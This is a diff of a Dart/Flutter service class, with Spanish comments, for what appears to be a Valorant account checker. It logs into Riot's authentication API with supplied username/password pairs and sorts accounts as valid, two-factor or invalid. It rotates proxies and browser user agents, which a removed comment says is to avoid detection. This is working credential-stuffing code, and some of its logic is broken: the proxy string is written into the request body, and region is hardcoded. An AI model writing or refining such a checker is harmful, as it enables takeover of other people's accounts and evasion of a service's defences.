@@ -1,324 +1,503 @@
+import 'dart:convert';
 import 'dart:math';
+import 'package:flutter/foundation.dart';
 import 'package:dio/dio.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import '../models/account.dart';
 import '../models/checker_config.dart';
-import '../utils/constants.dart';
-import 'proxy_service.dart';
-import 'package:flutter/foundation.dart';
 
 class ApiService {
+  static const String _prefsKeyAccessToken = 'riot_access_token';
+  static const String _prefsKeyIdToken = 'riot_id_token';
+  static const String _prefsKeyEntitlements = 'riot_entitlements';
+  static const String _prefsKeyExpiresAt = 'riot_expires_at';
+
   late Dio _dio;
+  late Dio _authDio;
   final CheckerConfig config;
-  final Map<String, dynamic> _cache = {};
-  final Random _random = Random();
+  final List<String> _proxies;
+  int _currentProxyIndex = 0;
 
-  // User agents rotativos para evitar detección
-  static const List<String> _userAgents = [
-    'RiotClient/58.0.0.6400298.4552318 rso-auth (Windows; 10;;Professional, x64)',
-    'RiotClient/58.0.0.6400298.4552318 rso-auth (Windows; 11;;Professional, x64)',
-    'RiotClient/58.0.0.6400298.4552318 rso-auth (Windows; 10;;Home, x64)',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-  ];
+  ApiService(this.config, this._proxies) {
+    _initializeDio();
+  }
 
-  ApiService({required this.config}) {
+  void _initializeDio() {
     _dio = Dio(
       BaseOptions(
         connectTimeout: Duration(seconds: config.requestTimeout),
         receiveTimeout: Duration(seconds: config.requestTimeout),
         headers: {
-          'User-Agent': _userAgents[_random.nextInt(_userAgents.length)],
+          'User-Agent': _getRandomUserAgent(),
           'Accept': 'application/json, text/plain, */*',
-          'Accept-Language': 'en-US,en;q=0.9',
+          'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
           'Accept-Encoding': 'gzip, deflate, br',
           'Connection': 'keep-alive',
+          'Content-Type': 'application/json',
         },
       ),
     );
 
-    // Configurar proxy aleatorio para esta instancia
-    ProxyService.configureProxyForDio(_dio);
+    // Cliente dedicado para autenticación (sin proxy)
+    _authDio = Dio(
+      BaseOptions(
+        connectTimeout: Duration(seconds: config.requestTimeout),
+        receiveTimeout: Duration(seconds: config.requestTimeout),
+        headers: {
+          'User-Agent':
+              'RiotClient/58.0.0.6400298.4552318 rso-auth (Windows; 10;;Professional, x64)',
+          'Accept': 'application/json, text/plain, */*',
+          'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
+          'Accept-Encoding': 'gzip, deflate, br',
+          'Connection': 'keep-alive',
+          'Content-Type': 'application/json',
+          'X-Riot-ClientPlatform': _clientPlatformB64(),
+          'X-Riot-ClientVersion': 'release-10.0-ship',
+          'X-Riot-ClientId': 'riot-client',
+          'X-Requested-With': 'RiotClient',
+          'Origin': 'https://auth.riotgames.com',
+          'Referer': 'https://riot-client/',
+        },
+      ),
+    );
 
-    // Configurar interceptores para rate limiting
+    _setupInterceptors();
+  }
+
+  void _setupInterceptors() {
     _dio.interceptors.add(
       InterceptorsWrapper(
-        onRequest: (options, handler) async {
-          // Rotar User-Agent
-          options.headers['User-Agent'] =
-              _userAgents[_random.nextInt(_userAgents.length)];
-
-          // Rotar proxy para cada request
-          ProxyService.configureProxyForDio(_dio);
-
-          // Agregar delay aleatorio más largo para evitar rate limiting
-          if (config.enableRandomDelays) {
-            final delay = _random.nextInt(5000) + 3000; // 3-8 segundos
-            await Future.delayed(Duration(milliseconds: delay));
+        onRequest: (options, handler) {
+          if (_proxies.isNotEmpty) {
+            _rotateProxy();
+            options.data = _getCurrentProxy();
           }
           handler.next(options);
-        },
-        onError: (error, handler) async {
-          // Manejar errores de rate limiting
-          if (error.response?.statusCode == 429) {
-            debugPrint('⚠️ Rate limiting detectado, esperando 10 segundos...');
-            await Future.delayed(Duration(seconds: 10));
-            // Reintentar la solicitud
-            handler.resolve(await _dio.fetch(error.requestOptions));
-            return;
-          }
-
-          // Manejar otros errores de red
-          String errorMessage = 'unknown_error';
-          if (error.type == DioExceptionType.connectionTimeout ||
-              error.type == DioExceptionType.receiveTimeout) {
-            errorMessage = 'timeout_error';
-          } else if (error.type == DioExceptionType.connectionError) {
-            errorMessage = 'network_error';
-          }
-
-          final customError = DioException(
-            requestOptions: error.requestOptions,
-            type: error.type,
-            error: errorMessage,
-          );
-          handler.next(customError);
         },
       ),
     );
   }
 
-  /// Verifica una cuenta de Valorant usando la API oficial
-  Future<Account> checkAccount(Account account) async {
+  String _getRandomUserAgent() {
+    final userAgents = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
+    ];
+    return userAgents[Random().nextInt(userAgents.length)];
+  }
+
+  void _rotateProxy() {
+    if (_proxies.isNotEmpty) {
+      _currentProxyIndex = (_currentProxyIndex + 1) % _proxies.length;
+    }
+  }
+
+  String? _getCurrentProxy() {
+    if (_proxies.isEmpty) return null;
+    return _proxies[_currentProxyIndex];
+  }
+
+  String _clientPlatformB64() {
+    const platform = {
+      "platformType": "PC",
+      "platformOS": "Windows",
+      "platformOSVersion": "10.0.19045.1.256.64bit",
+      "platformChipset": "Unknown",
+    };
+    return base64.encode(utf8.encode(json.encode(platform)));
+  }
+
+  // Verificar si hay tokens guardados válidos
+  Future<bool> _hasValidTokens() async {
+    final prefs = await SharedPreferences.getInstance();
+    final accessToken = prefs.getString(_prefsKeyAccessToken);
+    final expiresAtStr = prefs.getString(_prefsKeyExpiresAt);
+
+    if (accessToken == null || expiresAtStr == null) {
+      return false;
+    }
+
+    final expiresAt = DateTime.parse(expiresAtStr);
+    return DateTime.now().isBefore(expiresAt);
+  }
+
+  // Obtener tokens guardados
+  Future<Map<String, String?>> _getSavedTokens() async {
+    final prefs = await SharedPreferences.getInstance();
+    return {
+      'accessToken': prefs.getString(_prefsKeyAccessToken),
+      'idToken': prefs.getString(_prefsKeyIdToken),
+      'entitlementsToken': prefs.getString(_prefsKeyEntitlements),
+    };
+  }
+
+  Future<Account> checkAccount(String username, String password) async {
     try {
-      // Verificar caché primero
-      if (config.enableCache) {
-        final cached = _getFromCache(account.username);
-        if (cached != null) {
-          return cached;
-        }
+      // Primero verificar si hay tokens válidos guardados
+      if (await _hasValidTokens()) {
+        debugPrint('Usando tokens guardados para verificar cuenta');
+        return await _checkAccountWithTokens(username, password);
+      } else {
+        debugPrint('No hay tokens válidos, intentando autenticación directa');
+        return await _checkAccountWithDirectAuth(username, password);
       }
-
-      debugPrint('🔍 Verificando cuenta: ${account.username}');
-
-      // Paso 1: Obtener cookies de sesión
-      final cookies = await _getSessionCookies();
-      if (cookies == null) {
-        debugPrint('❌ Error obteniendo cookies de sesión');
-        return account.copyWith(
-          status: AppConstants.statusError,
-          errorMessage: 'Error obteniendo cookies de sesión',
-          lastChecked: DateTime.now(),
-        );
-      }
-
-      // Paso 2: Autenticar con Riot
-      final authData = await _authenticateRiot(
-        account.username,
-        account.password,
-        cookies,
-      );
-      if (authData == null) {
-        debugPrint('❌ Error en autenticación para: ${account.username}');
-        return account.copyWith(
-          status: AppConstants.statusError,
-          errorMessage: AppConstants.errorMessages['invalid_credentials'],
-          lastChecked: DateTime.now(),
-        );
-      }
-
-      // Paso 3: Obtener token de acceso
-      final accessToken = await _getAccessToken(authData);
-      if (accessToken == null) {
-        debugPrint('❌ Error obteniendo token de acceso para: ${account.username}');
-        return account.copyWith(
-          status: AppConstants.statusError,
-          errorMessage: 'Error obteniendo token de acceso',
-          lastChecked: DateTime.now(),
-        );
-      }
-
-      // Paso 4: Obtener entitlements
-      final entitlementsToken = await _getEntitlementsToken(accessToken);
-      if (entitlementsToken == null) {
-        debugPrint('❌ Error obteniendo entitlements para: ${account.username}');
-        return account.copyWith(
-          status: AppConstants.statusError,
-          errorMessage: 'Error obteniendo entitlements',
-          lastChecked: DateTime.now(),
-        );
-      }
-
-      // Paso 5: Obtener información del usuario
-      final userInfo = await _getUserInfo(accessToken);
-      if (userInfo == null) {
-        debugPrint('❌ Error obteniendo información del usuario para: ${account.username}');
-        return account.copyWith(
-          status: AppConstants.statusError,
-          errorMessage: 'Error obteniendo información del usuario',
-          lastChecked: DateTime.now(),
-        );
-      }
-
-      // Paso 6: Determinar región
-      final region = await _getUserRegion(accessToken, userInfo['sub']);
-
-      // Paso 7: Obtener información del jugador usando API oficial
-      final playerInfo = await _getPlayerInfoOfficial(
-        accessToken,
-        entitlementsToken,
-        region,
-        userInfo['sub'],
-      );
-      if (playerInfo == null) {
-        debugPrint('❌ Error obteniendo información del jugador para: ${account.username}');
-        return account.copyWith(
-          status: AppConstants.statusError,
-          errorMessage: 'Error obteniendo información del jugador',
-          lastChecked: DateTime.now(),
-        );
-      }
-
-      // Procesar información del jugador
-      final processedAccount = _processPlayerInfo(account, playerInfo, region);
-
-      debugPrint('✅ Cuenta verificada exitosamente: ${account.username} - ${processedAccount.status}');
-
-      // Guardar en caché
-      if (config.enableCache) {
-        _saveToCache(processedAccount);
-      }
-
-      return processedAccount;
     } catch (e) {
-      debugPrint('❌ Error general verificando cuenta ${account.username}: $e');
-      return account.copyWith(
-        status: AppConstants.statusError,
-        errorMessage: e.toString(),
-        lastChecked: DateTime.now(),
+      debugPrint('Error verificando cuenta: $e');
+      return Account(
+        username: username,
+        password: password,
+        status: 'invalidCredentials',
+        region: null,
+        level: null,
+        hasSkins: null,
+        skinCount: null,
+        errorMessage: 'Error de conexión: $e',
       );
     }
   }
 
-  /// Obtiene cookies de sesión iniciales
-  Future<Map<String, String>?> _getSessionCookies() async {
+  Future<Account> _checkAccountWithTokens(
+    String username,
+    String password,
+  ) async {
     try {
-      debugPrint('🍪 Obteniendo cookies de sesión...');
-      
-      final response = await _dio.post(
-        '${AppConstants.riotAuthUrl}/api/v1/authorization',
+      final tokens = await _getSavedTokens();
+      final accessToken = tokens['accessToken'];
+      final entitlementsToken = tokens['entitlementsToken'];
+
+      if (accessToken == null || entitlementsToken == null) {
+        throw Exception('Tokens incompletos');
+      }
+
+      // Usar los tokens para obtener información del jugador
+      final playerInfo = await _getPlayerInfoWithTokens(
+        username,
+        accessToken,
+        entitlementsToken,
+      );
+
+      if (playerInfo != null) {
+        return Account(
+          username: username,
+          password: password,
+          status: 'valid',
+          region: playerInfo['region'],
+          level: playerInfo['level'],
+          hasSkins: playerInfo['hasSkins'],
+          skinCount: playerInfo['skinCount'],
+        );
+      } else {
+        // Si no se encuentra el jugador, intentar autenticación directa
+        return await _checkAccountWithDirectAuth(username, password);
+      }
+    } catch (e) {
+      debugPrint('Error con tokens guardados: $e');
+      return await _checkAccountWithDirectAuth(username, password);
+    }
+  }
+
+  Future<Account> _checkAccountWithDirectAuth(
+    String username,
+    String password,
+  ) async {
+    try {
+      final authResult = await _authenticateRiot(username, password);
+
+      if (authResult['type'] == 'multifactor') {
+        return Account(
+          username: username,
+          password: password,
+          status: 'twoFactor',
+          region: null,
+          level: null,
+          hasSkins: null,
+          skinCount: null,
+        );
+      }
+
+      if (authResult['type'] == 'success') {
+        final playerInfo = await _getPlayerInfoWithTokens(
+          username,
+          authResult['accessToken'],
+          authResult['entitlementsToken'],
+        );
+
+        if (playerInfo != null) {
+          return Account(
+            username: username,
+            password: password,
+            status: 'valid',
+            region: playerInfo['region'],
+            level: playerInfo['level'],
+            hasSkins: playerInfo['hasSkins'],
+            skinCount: playerInfo['skinCount'],
+          );
+        }
+      }
+
+      return Account(
+        username: username,
+        password: password,
+        status: 'invalidCredentials',
+        region: null,
+        level: null,
+        hasSkins: null,
+        skinCount: null,
+      );
+    } catch (e) {
+      debugPrint('Error en autenticación directa: $e');
+      return Account(
+        username: username,
+        password: password,
+        status: 'invalidCredentials',
+        region: null,
+        level: null,
+        hasSkins: null,
+        skinCount: null,
+        errorMessage: 'Error de autenticación: $e',
+      );
+    }
+  }
+
+  Future<Map<String, dynamic>?> _getPlayerInfoWithTokens(
+    String username,
+    String accessToken,
+    String entitlementsToken,
+  ) async {
+    try {
+      // Obtener información del usuario
+      final userInfo = await _getUserInfo(accessToken);
+      if (userInfo == null) return null;
+
+      // Obtener información del jugador de Valorant
+      final playerInfo = await _getValorantPlayerInfo(
+        username,
+        accessToken,
+        entitlementsToken,
+      );
+      if (playerInfo == null) return null;
+
+      return {
+        'region': playerInfo['region'],
+        'level': playerInfo['level'],
+        'hasSkins': playerInfo['hasSkins'],
+        'skinCount': playerInfo['skinCount'],
+      };
+    } catch (e) {
+      debugPrint('Error obteniendo información del jugador: $e');
+      return null;
+    }
+  }
+
+  Future<Map<String, dynamic>?> _getUserInfo(String accessToken) async {
+    try {
+      final response = await _authDio.get(
+        'https://auth.riotgames.com/userinfo',
+        options: Options(headers: {'Authorization': 'Bearer $accessToken'}),
+      );
+
+      if (response.statusCode == 200) {
+        return response.data;
+      }
+      return null;
+    } catch (e) {
+      debugPrint('Error obteniendo user info: $e');
+      return null;
+    }
+  }
+
+  Future<Map<String, dynamic>?> _getValorantPlayerInfo(
+    String username,
+    String accessToken,
+    String entitlementsToken,
+  ) async {
+    try {
+      // Obtener PUUID del usuario
+      final userInfo = await _getUserInfo(accessToken);
+      if (userInfo == null) return null;
+
+      final puuid = userInfo['sub'];
+      if (puuid == null) return null;
+
+      // Obtener información del jugador de Valorant
+      final response = await _authDio.get(
+        'https://pd.na.a.pvp.net/mmr/v1/players/$puuid',
+        options: Options(
+          headers: {
+            'Authorization': 'Bearer $accessToken',
+            'X-Riot-Entitlements-JWT': entitlementsToken,
+            'X-Riot-ClientPlatform': _clientPlatformB64(),
+            'X-Riot-ClientVersion': 'release-10.0-ship',
+          },
+        ),
+      );
+
+      if (response.statusCode == 200) {
+        final data = response.data;
+        return _processPlayerInfo(data, username);
+      }
+      return null;
+    } catch (e) {
+      debugPrint('Error obteniendo información de Valorant: $e');
+      return null;
+    }
+  }
+
+  Map<String, dynamic> _processPlayerInfo(
+    Map<String, dynamic> data,
+    String username,
+  ) {
+    try {
+      final currentSeason = data['CurrentSeason'] as Map<String, dynamic>?;
+      final level = currentSeason?['RankedRating'] ?? 0;
+
+      // Determinar región basada en el endpoint usado
+      String region = 'na'; // Por defecto
+
+      // Verificar si tiene skins (esto requeriría una llamada adicional)
+      bool hasSkins = false;
+      int skinCount = 0;
+
+      return {
+        'region': region,
+        'level': level,
+        'hasSkins': hasSkins,
+        'skinCount': skinCount,
+      };
+    } catch (e) {
+      debugPrint('Error procesando información del jugador: $e');
+      return {
+        'region': 'unknown',
+        'level': 0,
+        'hasSkins': false,
+        'skinCount': 0,
+      };
+    }
+  }
+
+  Future<Map<String, dynamic>> _authenticateRiot(
+    String username,
+    String password,
+  ) async {
+    try {
+      // Paso 1: Obtener cookies de sesión
+      final cookiesResponse = await _authDio.post(
+        'https://auth.riotgames.com/api/v1/authorization',
         data: {
           'client_id': 'play-valorant-web-prod',
           'response_type': 'token id_token',
           'redirect_uri': 'https://playvalorant.com/opt_in',
           'nonce': '1',
         },
-        options: Options(
-          headers: {
-            'Content-Type': 'application/json',
-          },
-        ),
       );
 
-      debugPrint('🍪 Status code de cookies: ${response.statusCode}');
-
-      if (response.statusCode == 200) {
-        final cookies = <String, String>{};
-        if (response.headers.map.containsKey('set-cookie')) {
-          final cookieHeaders = response.headers.map['set-cookie']!;
-          for (final cookie in cookieHeaders) {
-            final parts = cookie.split(';')[0].split('=');
-            if (parts.length == 2) {
-              cookies[parts[0]] = parts[1];
-            }
-          }
-        }
-        debugPrint('✅ Cookies de sesión obtenidas: ${cookies.length} cookies');
-        return cookies;
+      if (cookiesResponse.statusCode != 200) {
+        debugPrint('Error obteniendo cookies: ${cookiesResponse.statusCode}');
+        return {'type': 'auth_failure'};
       }
-      debugPrint('❌ Error obteniendo cookies: ${response.statusCode}');
-      return null;
-    } catch (e) {
-      debugPrint('❌ Excepción obteniendo cookies: $e');
-      return null;
-    }
-  }
 
-  /// Autentica con Riot Games
-  Future<Map<String, dynamic>?> _authenticateRiot(
-    String username,
-    String password,
-    Map<String, String> cookies,
-  ) async {
-    try {
-      final cookieString = cookies.entries
-          .map((e) => '${e.key}=${e.value}')
-          .join('; ');
-
-      debugPrint('🔐 Intentando autenticar: $username');
-
-      final response = await _dio.put(
-        '${AppConstants.riotAuthUrl}/api/v1/authorization',
+      // Paso 2: Autenticar con credenciales usando PUT
+      final authResponse = await _authDio.put(
+        'https://auth.riotgames.com/api/v1/authorization',
         data: {
           'type': 'auth',
           'username': username,
           'password': password,
           'remember': true,
         },
-        options: Options(
-          headers: {
-            'Cookie': cookieString,
-            'Content-Type': 'application/json',
-          },
-        ),
       );
 
-      debugPrint('🔐 Status code de autenticación: ${response.statusCode}');
+      if (authResponse.statusCode == 200) {
+        final data = authResponse.data;
+        debugPrint('Respuesta de autenticación: ${data['type']}');
 
-      if (response.statusCode == 200) {
-        final data = response.data;
-        debugPrint('🔐 Respuesta de autenticación: ${data['type']}');
-        
         if (data['type'] == 'response') {
-          debugPrint('✅ Autenticación exitosa');
-          return data;
+          // Autenticación exitosa
+          final uri = data['response']['parameters']['uri'];
+          final accessToken = _extractAccessToken(uri);
+
+          if (accessToken != null) {
+            // Obtener entitlements
+            final entitlementsResponse = await _authDio.post(
+              'https://entitlements.auth.riotgames.com/api/token/v1',
+              options: Options(
+                headers: {'Authorization': 'Bearer $accessToken'},
+              ),
+              data: {},
+            );
+
+            if (entitlementsResponse.statusCode == 200) {
+              final entitlementsToken =
+                  entitlementsResponse.data['entitlements_token'];
+              return {
+                'type': 'success',
+                'accessToken': accessToken,
+                'entitlementsToken': entitlementsToken,
+              };
+            }
+          }
         } else if (data['type'] == 'multifactor') {
-          debugPrint('⚠️ Autenticación de dos factores requerida');
-          return null;
-        } else if (data['type'] == 'auth') {
-          debugPrint('⚠️ Error de autenticación: ${data['error']}');
-          return null;
-        } else {
-          debugPrint('⚠️ Tipo de respuesta desconocido: ${data['type']}');
-          return null;
+          return {'type': 'multifactor', 'requires2FA': true};
+        } else if (data['type'] == 'auth_failure') {
+          // Intentar con remember=false
+          final retryResponse = await _authDio.put(
+            'https://auth.riotgames.com/api/v1/authorization',
+            data: {
+              'type': 'auth',
+              'username': username,
+              'password': password,
+              'remember': false,
+            },
+          );
+
+          if (retryResponse.statusCode == 200) {
+            final retryData = retryResponse.data;
+            if (retryData['type'] == 'response') {
+              final uri = retryData['response']['parameters']['uri'];
+              final accessToken = _extractAccessToken(uri);
+
+              if (accessToken != null) {
+                final entitlementsResponse = await _authDio.post(
+                  'https://entitlements.auth.riotgames.com/api/token/v1',
+                  options: Options(
+                    headers: {'Authorization': 'Bearer $accessToken'},
+                  ),
+                  data: {},
+                );
+
+                if (entitlementsResponse.statusCode == 200) {
+                  final entitlementsToken =
+                      entitlementsResponse.data['entitlements_token'];
+                  return {
+                    'type': 'success',
+                    'accessToken': accessToken,
+                    'entitlementsToken': entitlementsToken,
+                  };
+                }
+              }
+            }
+          }
+
+          // Si aún falla, intentar detección de 2FA
+          final twoFactorResult = await _tryWebAuth(username, password);
+          if (twoFactorResult) {
+            return {'type': 'multifactor', 'requires2FA': true};
+          }
+
+          return {'type': 'auth_failure'};
         }
-      } else {
-        debugPrint('❌ Error en autenticación: ${response.statusCode} - ${response.data}');
-        return null;
       }
+
+      return {'type': 'auth_failure'};
     } catch (e) {
-      debugPrint('❌ Excepción en autenticación: $e');
-      return null;
+      debugPrint('Error en _authenticateRiot: $e');
+      return {'type': 'auth_failure'};
     }
   }
 
-  /// Extrae token de acceso de la respuesta de autenticación
-  Future<String?> _getAccessToken(Map<String, dynamic> authData) async {
+  String? _extractAccessToken(String uri) {
     try {
-      debugPrint('🔑 Extrayendo token de acceso...');
-      
-      if (authData['response'] == null || authData['response']['parameters'] == null) {
-        debugPrint('❌ Estructura de respuesta inválida');
-        return null;
-      }
-      
-      final uri = authData['response']['parameters']['uri'] as String?;
-      if (uri == null) {
-        debugPrint('❌ URI no encontrada en la respuesta');
-        return null;
-      }
-      
-      debugPrint('🔑 URI encontrada: ${uri.substring(0, uri.length > 50 ? 50 : uri.length)}...');
-      
       if (uri.contains('access_token=')) {
         final tokenStart = uri.indexOf('access_token=') + 13;
         var tokenEnd = uri.indexOf('&', tokenStart);
@@ -328,289 +507,38 @@ class ApiService {
         if (tokenEnd == -1) {
           tokenEnd = uri.length;
         }
-        final token = uri.substring(tokenStart, tokenEnd);
-        debugPrint('✅ Token de acceso obtenido (${token.length} caracteres)');
-        return token;
+        return uri.substring(tokenStart, tokenEnd);
       }
-      debugPrint('❌ No se encontró token de acceso en la URI');
       return null;
     } catch (e) {
-      debugPrint('❌ Excepción obteniendo token: $e');
+      debugPrint('Error extrayendo token: $e');
       return null;
     }
   }
 
-  /// Obtiene entitlements token
-  Future<String?> _getEntitlementsToken(String accessToken) async {
+  Future<bool> _tryWebAuth(String username, String password) async {
     try {
-      debugPrint('🎫 Obteniendo entitlements token...');
-      
-      final response = await _dio.post(
-        '${AppConstants.riotEntitlementsUrl}/api/token/v1',
-        options: Options(
-          headers: {
-            'Authorization': 'Bearer $accessToken',
-            'Content-Type': 'application/json',
-          },
-        ),
+      final response = await _authDio.post(
+        'https://auth.riotgames.com/api/v1/authorization',
+        data: {
+          'type': 'auth',
+          'username': username,
+          'password': password,
+          'remember': false,
+          'client_id': 'riot-client',
+          'redirect_uri': 'https://auth.riotgames.com/redirect',
+          'scope': 'account openid',
+        },
       );
-
-      debugPrint('🎫 Status code de entitlements: ${response.statusCode}');
 
       if (response.statusCode == 200) {
-        final token = response.data['entitlements_token'];
-        if (token != null) {
-          debugPrint('✅ Entitlements token obtenido (${token.length} caracteres)');
-          return token;
-        } else {
-          debugPrint('❌ Entitlements token no encontrado en la respuesta');
-          return null;
-        }
+        final data = response.data;
+        return data['type'] == 'multifactor';
       }
-      debugPrint('❌ Error obteniendo entitlements: ${response.statusCode} - ${response.data}');
-      return null;
+      return false;
     } catch (e) {
-      debugPrint('❌ Excepción obteniendo entitlements: $e');
-      return null;
+      debugPrint('Error en _tryWebAuth: $e');
+      return false;
     }
-  }
-
-  /// Obtiene información del usuario
-  Future<Map<String, dynamic>?> _getUserInfo(String accessToken) async {
-    try {
-      debugPrint('👤 Obteniendo información del usuario...');
-      
-      final response = await _dio.get(
-        '${AppConstants.riotAuthUrl}/userinfo',
-        options: Options(
-          headers: {
-            'Authorization': 'Bearer $accessToken',
-            'Content-Type': 'application/json',
-          },
-        ),
-      );
-
-      debugPrint('👤 Status code de userinfo: ${response.statusCode}');
-
-      if (response.statusCode == 200) {
-        final userData = response.data;
-        if (userData['sub'] != null) {
-          debugPrint('✅ Información del usuario obtenida: ${userData['sub']}');
-          return userData;
-        } else {
-          debugPrint('❌ Sub no encontrado en la respuesta del usuario');
-          return null;
-        }
-      }
-      debugPrint('❌ Error obteniendo información del usuario: ${response.statusCode} - ${response.data}');
-      return null;
-    } catch (e) {
-      debugPrint('❌ Excepción obteniendo información del usuario: $e');
-      return null;
-    }
-  }
-
-  /// Determina la región del usuario
-  Future<String> _getUserRegion(String accessToken, String userId) async {
-    final regions = ['na', 'eu', 'ap', 'br', 'kr', 'latam'];
-
-    debugPrint('🌍 Determinando región para usuario: $userId');
-
-    for (final region in regions) {
-      try {
-        debugPrint('🌍 Probando región: $region');
-        
-        final response = await _dio.put(
-          'https://pd.$region.a.pvp.net/name-service/v2/players',
-          data: [userId],
-          options: Options(
-            headers: {
-              'Authorization': 'Bearer $accessToken',
-              'X-Riot-ClientPlatform':
-                  'ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9',
-              'Content-Type': 'application/json',
-            },
-          ),
-        );
-
-        if (response.statusCode == 200) {
-          debugPrint('✅ Región determinada: $region');
-          return region;
-        } else {
-          debugPrint('⚠️ Región $region no válida: ${response.statusCode}');
-        }
-      } catch (e) {
-        debugPrint('⚠️ Error probando región $region: $e');
-        continue;
-      }
-    }
-
-    debugPrint('⚠️ No se pudo determinar región, usando NA por defecto');
-    return 'na'; // Región por defecto
-  }
-
-  /// Obtiene información del jugador usando API oficial de Valorant
-  Future<Map<String, dynamic>?> _getPlayerInfoOfficial(
-    String accessToken,
-    String entitlementsToken,
-    String region,
-    String userId,
-  ) async {
-    try {
-      debugPrint('🎮 Obteniendo información del jugador para región: $region, usuario: $userId');
-      
-      final headers = {
-        'Authorization': 'Bearer $accessToken',
-        'X-Riot-Entitlements-JWT': entitlementsToken,
-        'X-Riot-ClientPlatform':
-            'ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9',
-        'Content-Type': 'application/json',
-      };
-
-      // Obtener PUUID del usuario
-      final puuid = userId;
-
-      // Obtener información del jugador usando API oficial
-      final playerResponse = await _dio.get(
-        'https://pd.$region.a.pvp.net/player-loadout/v2/$puuid',
-        options: Options(headers: headers),
-      );
-
-      debugPrint('🎮 Status code de player-loadout: ${playerResponse.statusCode}');
-
-      if (playerResponse.statusCode == 200) {
-        final playerData = playerResponse.data;
-
-        // Obtener nivel del jugador
-        final levelResponse = await _dio.get(
-          'https://pd.$region.a.pvp.net/account-xp/v1/players/$puuid',
-          options: Options(headers: headers),
-        );
-
-        int level = 1;
-        if (levelResponse.statusCode == 200) {
-          final levelData = levelResponse.data;
-          level = levelData['Progress']?['Level'] ?? 1;
-          debugPrint('🎮 Nivel del jugador: $level');
-        } else {
-          debugPrint('⚠️ Error obteniendo nivel: ${levelResponse.statusCode}');
-        }
-
-        // Obtener información de la cuenta
-        final accountResponse = await _dio.get(
-          'https://pd.$region.a.pvp.net/player-account/account',
-          options: Options(headers: headers),
-        );
-
-        bool isBanned = false;
-        bool isLocked = false;
-
-        if (accountResponse.statusCode == 200) {
-          final accountData = accountResponse.data;
-          isBanned = accountData['banned'] ?? false;
-          isLocked = accountData['locked'] ?? false;
-          debugPrint('🎮 Estado de cuenta - Baneada: $isBanned, Bloqueada: $isLocked');
-        } else {
-          debugPrint('⚠️ Error obteniendo información de cuenta: ${accountResponse.statusCode}');
-        }
-
-        // Obtener skins
-        List<String> skins = [];
-        if (playerData['Guns'] != null) {
-          for (final gun in playerData['Guns']) {
-            if (gun['Skins'] != null && gun['Skins'].isNotEmpty) {
-              final skinId = gun['Skins'][0]['ID'];
-              skins.add(skinId);
-            }
-          }
-        }
-
-        // Combinar información
-        final playerInfo = {
-          'region': region,
-          'userId': puuid,
-          'AccountLevel': level,
-          'skins': skins,
-          'banned': isBanned,
-          'locked': isLocked,
-          'additionalData': {'profile': playerData, 'level': level},
-        };
-
-        debugPrint('✅ Información del jugador obtenida: Nivel $level, ${skins.length} skins');
-        return playerInfo;
-      }
-      debugPrint('❌ Error obteniendo información del jugador: ${playerResponse.statusCode} - ${playerResponse.data}');
-      return null;
-    } catch (e) {
-      debugPrint('❌ Excepción obteniendo información del jugador: $e');
-      return null;
-    }
-  }
-
-  /// Procesa la información del jugador
-  Account _processPlayerInfo(
-    Account account,
-    Map<String, dynamic> playerInfo,
-    String region,
-  ) {
-    final level = playerInfo['AccountLevel'] ?? 1;
-    final hasSkins =
-        playerInfo['skins'] != null && (playerInfo['skins'] as List).isNotEmpty;
-    final isBanned = playerInfo['banned'] == true;
-    final isLocked = playerInfo['locked'] == true;
-
-    String status = AppConstants.statusValid;
-    if (isBanned) {
-      status = AppConstants.statusBanned;
-    } else if (isLocked) {
-      status = AppConstants.statusLocked;
-    }
-
-    return account.copyWith(
-      status: status,
-      region: region,
-      level: level,
-      hasSkins: hasSkins,
-      isBanned: isBanned,
-      isLocked: isLocked,
-      lastChecked: DateTime.now(),
-      additionalData: playerInfo['additionalData'],
-    );
-  }
-
-  /// Obtiene cuenta del caché
-  Account? _getFromCache(String username) {
-    final cached = _cache[username];
-    if (cached != null) {
-      final lastChecked = DateTime.parse(cached['lastChecked']);
-      final hoursSinceCheck = DateTime.now().difference(lastChecked).inHours;
-
-      if (hoursSinceCheck < config.cacheDuration) {
-        return Account.fromJson(cached);
-      } else {
-        _cache.remove(username);
-      }
-    }
-    return null;
-  }
-
-  /// Guarda cuenta en caché
-  void _saveToCache(Account account) {
-    if (_cache.length >= config.maxCacheSize) {
-      // Eliminar entrada más antigua
-      final oldestKey = _cache.keys.first;
-      _cache.remove(oldestKey);
-    }
-    _cache[account.username] = account.toJson();
-  }
-
-  /// Limpia el caché
-  void clearCache() {
-    _cache.clear();
-  }
-
-  /// Obtiene estadísticas del caché
-  Map<String, dynamic> getCacheStats() {
-    return {'size': _cache.length, 'maxSize': config.maxCacheSize};
   }
 }
